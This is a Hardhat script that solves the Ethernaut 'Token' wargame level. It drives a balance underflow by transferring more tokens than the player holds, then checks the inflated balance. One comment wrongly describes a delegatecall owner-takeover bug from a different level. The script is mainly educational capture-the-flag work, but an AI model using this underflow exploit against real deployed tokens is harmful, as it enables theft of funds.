import { ethers } from "hardhat";

const attackToken = async () => {
    // change contract addresses here.
    const tokenAddress = process.env.TOKEN!; //type "await contract.address()" in ethernaut console
    // const player = ""; //place your player address here (you may type player in ethernaut console)
    const args: [] = [];
    const player = process.env.PRIVATE_KEY || "";
    // [deployer] = await ethers.getSigners();

    // Don't touch below 🚀
    // Vulnerability from pwn() function with delegatecall in fallback to change owner
    // additional read:
    // https://docs.soliditylang.org/en/v0.6.0/security-considerations.html#two-s-complement-underflows-overflows
    // typing all commands in console below
    // wallet here
    // using my custom rpc stored in .env (for privacy)
    const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
    const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
    const players = new ethers.Wallet(player, provider);
    console.log("Player's address is: ", players.address);

    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
    const ABI = [
        {
            inputs: [{ internalType: "uint256", name: "_initialSupply", type: "uint256" }],
            outputs: [],
            payable: undefined,
            stateMutability: "nonpayable",
            type: "constructor",
        },
        {
            inputs: [{ internalType: "address", name: "_owner", type: "address" }],
            name: "balanceOf",
            outputs: [{ internalType: "uint256", name: "balance", type: "uint256" }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "totalSupply",
            outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [
                { internalType: "address", name: "_to", type: "address" },
                { internalType: "uint256", name: "_value", type: "uint256" },
            ],
            name: "transfer",
            outputs: [{ internalType: "bool", name: "", type: "bool" }],
            stateMutability: "nonpayable",
            type: "function",
        },
    ];

    const contract = await ethers.getContractAt(ABI, tokenAddress);
    console.log("Checking current player balance...");
    let playerBalance = await contract.balanceOf(players.address);
    console.log(`Current player balance: ${playerBalance} TOKENS`);
    console.log("Causing underflow by transfering more than the starting 20 TOKENS...");
    const underflow = await contract.transfer("0x0000000000000000000000000000000000000000", 21);
    const wait1 = await underflow.wait();
    console.log(wait1);
    console.log("Checking current player balance again...");
    playerBalance = await contract.balanceOf(players.address);
    console.log(`Current player balance: ${playerBalance} TOKENS`);
    if (playerBalance > 20) {
        console.log("Congrats Level Passed, submit to ethernaut...");
    } else {
        console.log("No Additional tokens, review code above and try again...");
    }
};

attackToken()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
